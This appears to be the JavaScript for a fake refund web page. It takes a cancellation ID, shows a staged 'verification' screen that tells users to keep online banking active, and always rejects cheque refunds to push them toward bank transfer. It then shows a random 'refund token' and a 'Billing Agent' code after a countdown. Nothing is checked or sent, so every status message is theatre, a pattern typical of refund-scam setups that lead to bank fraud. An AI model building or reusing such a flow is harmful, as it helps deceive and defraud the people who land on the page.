/* script.js
   Robust single-page refund flow with Billing Agent countdown and copy option.
   - Safe DOMContentLoaded wrapper
   - Clears previous timers when switching panels
   - Fallback copy-to-clipboard for older browsers
*/

document.addEventListener('DOMContentLoaded', () => {
  // Panel elements
  const panels = {
    enterId: document.getElementById('enter-id'),
    loading: document.getElementById('loading'),
    refundForm: document.getElementById('refund-form'),
    tokenPage: document.getElementById('token-page'),
  };

  // Forms & controls (some may be null if HTML changed)
  const idForm = document.getElementById('id-form');
  const cancelIdInput = document.getElementById('cancelId');

  const refundForm = document.getElementById('form-refund');
  const backToIdBtn = document.getElementById('back-to-id');

  const rotator = document.getElementById('message-rotator');

  // Token page elements (queried when DOM is ready)
  const tokenValueEl = document.getElementById('token-value');
  const dName = document.getElementById('d-name');
  const dEmail = document.getElementById('d-email');
  const dReason = document.getElementById('d-reason');
  const dPayment = document.getElementById('d-payment');
  const dCancelId = document.getElementById('d-cancelid');

  const agentCountdownEl = document.getElementById('agent-countdown');
  const agentCodeEl = document.getElementById('agent-code');

  const submitAgain = document.getElementById('submit-again');
  const editDetails = document.getElementById('edit-details');
  const startOver = document.getElementById('start-over');

  const paymentMethod = document.getElementById('paymentMethod');
  const extraFields = document.getElementById('extra-fields');

  // Loading messages
  const loadingMessages = [
    "Checking cancellation ID and eligibility...",
    "Important: Please make sure your online banking is active.",
    "Tip: Keep your refund token handy for faster support.",
    "Notice: Fees may apply as per our refund policy.",
    "Verifying bank details securely..."
  ];

  // State & timers
  let state = { cancelId: null, formData: null };
  let rotatorInterval = null;
  let agentTimer = null;

  // Utility: show panel (and clear agent timer when leaving token page)
  function showPanel(panelEl) {
    // If leaving token page, clear any agent timer to avoid duplicates
    if (agentTimer && panelEl !== panels.tokenPage) {
      clearInterval(agentTimer);
      agentTimer = null;
      if (agentCountdownEl) agentCountdownEl.textContent = '';
      if (agentCodeEl) agentCodeEl.innerHTML = '';
    }

    // Hide all panels
    Object.values(panels).forEach(p => {
      if (!p) return;
      p.classList.remove('visible');
      p.style.display = 'none';
    });

    // Show selected
    if (!panelEl) return;
    panelEl.style.display = 'flex';
    requestAnimationFrame(() => panelEl.classList.add('visible'));
  }

  // Loading rotator
  function startMessageRotator(messages, interval = 2200) {
    if (!rotator) return;
    stopMessageRotator();
    rotator.innerHTML = '';
    messages.forEach(m => {
      const div = document.createElement('div');
      div.className = 'msg';
      div.textContent = m;
      rotator.appendChild(div);
    });
    const nodes = Array.from(rotator.children);
    if (!nodes.length) return;
    let idx = 0;
    function showIndex(i) {
      nodes.forEach((n, j) => n.classList.toggle('show', i === j));
    }
    showIndex(idx);
    rotatorInterval = setInterval(() => {
      idx = (idx + 1) % nodes.length;
      showIndex(idx);
    }, interval);
  }
  function stopMessageRotator() {
    if (rotatorInterval) {
      clearInterval(rotatorInterval);
      rotatorInterval = null;
    }
  }

  // Show loading then navigate to 'form' or 'token' (opts.duration ms)
  function showLoadingThen(next, opts = {}) {
    showPanel(panels.loading);
    startMessageRotator(loadingMessages, 2300);
    const duration = opts.duration ?? 4800;
    return new Promise(resolve => {
      setTimeout(() => {
        stopMessageRotator();
        resolve();
      }, duration);
    }).then(() => {
      if (next === 'form') {
        showPanel(panels.refundForm);
      } else if (next === 'token') {
        renderTokenPage(opts.data || {});
        showPanel(panels.tokenPage);
      }
    });
  }

  // Token generator
  function generateToken() {
    const now = new Date();
    const yyyy = now.getFullYear().toString();
    const mm = String(now.getMonth() + 1).padStart(2, '0');
    const dd = String(now.getDate()).padStart(2, '0');
    const hh = String(now.getHours()).padStart(2, '0');
    const min = String(now.getMinutes()).padStart(2, '0');
    const ss = String(now.getSeconds()).padStart(2, '0');
    const r = Math.random().toString(36).slice(2, 7).toUpperCase();
    return `REF-${yyyy}${mm}${dd}-${hh}${min}${ss}-${r}`;
  }

  // Agent code generator
  function generateAgentCode() {
    return 'AGT-' + Math.random().toString(36).substr(2, 6).toUpperCase();
  }

  // Render token page and start 60s countdown, then reveal agent code + copy button
  function renderTokenPage(data) {
    // clear any existing agent timer
    if (agentTimer) {
      clearInterval(agentTimer);
      agentTimer = null;
    }

    // Populate token and details (safely)
    if (tokenValueEl) tokenValueEl.textContent = generateToken();
    if (dName) dName.textContent = data.name || '';
    if (dEmail) dEmail.textContent = data.email || '';
    if (dReason) dReason.textContent = data.reason || '';
    if (dPayment) dPayment.textContent = data.paymentInfo || '';
    if (dCancelId) dCancelId.textContent = state.cancelId || '(unknown)';

    // Reset agent display
    if (!agentCountdownEl || !agentCodeEl) return;
    agentCodeEl.innerHTML = '';
    let timeLeft = 60;
    agentCountdownEl.textContent = `Appointing Billing Agent: ${timeLeft} sec`;

    agentTimer = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        agentCountdownEl.textContent = `Appointing Billing Agent: ${timeLeft} sec`;
      } else {
        clearInterval(agentTimer);
        agentTimer = null;
        agentCountdownEl.textContent = 'Billing Agent Appointed!';

        const code = generateAgentCode();

        // Build elements
        const label = document.createTextNode('Agent Code: ');
        const span = document.createElement('span');
        span.id = 'agentCodeText';
        span.textContent = code;
        span.style.fontWeight = '700';
        span.style.margin = '0 8px';

        const btn = document.createElement('button');
        btn.type = 'button';
        btn.id = 'copyAgentCode';
        btn.className = 'btn small-btn';
        btn.textContent = 'Copy';

        const msg = document.createElement('span');
        msg.id = 'copyMsg';
        msg.textContent = 'Copied!';
        msg.style.color = 'green';
        msg.style.fontSize = '0.9rem';
        msg.style.marginLeft = '10px';
        msg.style.display = 'none';

        // Append to agentCodeEl
        agentCodeEl.appendChild(label);
        agentCodeEl.appendChild(span);
        agentCodeEl.appendChild(btn);
        agentCodeEl.appendChild(msg);

        // Copy handler with fallback
        btn.addEventListener('click', () => {
          const codeText = span.textContent || '';
          if (!codeText) return;

          // Preferred API
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(codeText).then(() => {
              msg.style.display = 'inline';
              setTimeout(() => (msg.style.display = 'none'), 1500);
            }).catch(() => fallbackCopy(codeText, msg));
          } else {
            fallbackCopy(codeText, msg);
          }
        });

        // fallback for older browsers
        function fallbackCopy(text, msgEl) {
          const ta = document.createElement('textarea');
          ta.value = text;
          // place off-screen
          ta.style.position = 'fixed';
          ta.style.left = '-9999px';
          document.body.appendChild(ta);
          ta.select();
          try {
            const ok = document.execCommand('copy');
            if (ok) {
              msgEl.style.display = 'inline';
              setTimeout(() => (msgEl.style.display = 'none'), 1500);
            } else {
              // last resort: prompt user to copy
              window.prompt('Copy the code manually:', text);
            }
          } catch (e) {
            window.prompt('Copy the code manually:', text);
          }
          ta.remove();
        }
      }
    }, 1000);
  }

  // Prefill form when editing (will also rebuild extra fields)
  function prefillForm(data) {
    if (!refundForm || !data) return;
    if (data.name) document.getElementById('name').value = data.name;
    if (data.email) document.getElementById('email').value = data.email;
    if (data.reason) document.getElementById('reason').value = data.reason;

    // Try to detect payment method and populate extra field
    if (data.paymentInfo) {
      // our paymentInfo format: "Online Bank Transfer - BANKNAME"
      if (data.paymentInfo.toLowerCase().includes('online')) {
        document.getElementById('paymentMethod').value = 'online';
        buildExtraFields('online', data);
      } else if (data.paymentInfo.toLowerCase().includes('cheque')) {
        document.getElementById('paymentMethod').value = 'cheque';
        buildExtraFields('cheque', data);
      }
    }
  }

  // Build extra fields for payment method
  function buildExtraFields(method, data = {}) {
    if (!extraFields) return;
    extraFields.innerHTML = '';
    if (method === 'cheque') {
      extraFields.innerHTML = `
        <label for="zip">Zip Code</label>
        <input id="zip" name="zip" type="text" placeholder="Enter zip code" required />
      `;
      if (data.zip) document.getElementById('zip').value = data.zip;
    } else if (method === 'online') {
      extraFields.innerHTML = `
        <label for="bankName">Bank Name</label>
        <input id="bankName" name="bankName" type="text" placeholder="Enter bank name" required />
      `;
      // if paymentInfo contains bank name, attempt to parse
      if (data.paymentInfo && data.paymentInfo.includes('-')) {
        const parts = data.paymentInfo.split('-').map(s => s.trim());
        if (parts.length > 1) document.getElementById('bankName').value = parts.slice(1).join('-');
      }
    }
  }

  //Event listeners: safe-guard (only add if elements exist)
  if (idForm) {
    idForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const idVal = (cancelIdInput && cancelIdInput.value || '').trim();
      if (!idVal) {
        if (cancelIdInput) cancelIdInput.focus();
        return;
      }
      state.cancelId = idVal;
      showLoadingThen('form', { duration: 4200 });
    });
  }

  if (backToIdBtn) backToIdBtn.addEventListener('click', () => showPanel(panels.enterId));

  if (refundForm) {
    refundForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const fd = new FormData(refundForm);
      const method = fd.get('paymentMethod');
      let paymentInfo = '';
      let stopFlow = false;

      if (method === 'cheque') {
        const zip = fd.get('zip')?.trim();
        if (!zip) {
          alert('Please enter your zip code.');
          return;
        }
        alert('Sorry, cheque refunds are not available in your area.');
        stopFlow = true;
      } else if (method === 'online') {
        const bankName = fd.get('bankName')?.trim();
        if (!bankName) {
          alert('Please enter your bank name.');
          return;
        }
        paymentInfo = `Online Bank Transfer - ${bankName}`;
      }

      const data = {
        name: fd.get('name')?.trim(),
        email: fd.get('email')?.trim(),
        reason: fd.get('reason')?.trim(),
        paymentInfo,
      };

      if (stopFlow) return;
      if (!data.name || !data.email || !data.reason || !data.paymentInfo) {
        alert('Please fill in all required fields.');
        return;
      }
      state.formData = data;
      showLoadingThen('token', { duration: 4800, data });
    });
  }

  if (submitAgain) {
    submitAgain.addEventListener('click', () => {
      if (!state.formData) {
        showPanel(panels.refundForm);
        return;
      }
      showLoadingThen('token', { duration: 3800, data: state.formData });
    });
  }

  if (editDetails) {
    editDetails.addEventListener('click', () => {
      prefillForm(state.formData);
      showPanel(panels.refundForm);
    });
  }

  if (startOver) {
    startOver.addEventListener('click', () => {
      state = { cancelId: null, formData: null };
      if (refundForm) refundForm.reset();
      if (idForm) idForm.reset();
      showPanel(panels.enterId);
    });
  }

  // Payment method change rebuilds extra fields
  if (paymentMethod) {
    paymentMethod.addEventListener('change', () => {
      buildExtraFields(paymentMethod.value);
    });
  }

  // Initial view
  showPanel(panels.enterId);
});